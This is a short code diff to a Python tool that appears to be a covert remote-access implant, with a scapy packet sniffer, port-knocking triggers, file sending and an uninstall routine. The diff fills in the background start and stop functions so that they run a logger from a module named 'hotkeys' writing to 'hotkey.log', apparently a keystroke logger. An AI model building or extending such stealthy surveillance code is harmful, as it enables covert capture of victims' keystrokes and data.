@@ -21,6 +21,7 @@ from datetime import datetime
 
 from scapy.all import AsyncSniffer, ICMP, IP, TCP
 
+from hotkeys import start_logger, stop_logger
 
 KNOCK_PORTS = (7000, 8000, 9000)
 KNOCK_TIMEOUT_SECONDS = 5.0
@@ -1095,11 +1096,13 @@ def send_file(ctx: Context):
 
 
 def run_bg(ctx: Context):
-    pass
+    print("Starting bg...")
+    start_logger("hotkey.log")
 
 
 def stop_bg(ctx: Context):
-    pass
+    print("Stopping bg...")
+    stop_logger()
 
 
 def uninstall(ctx: Context):
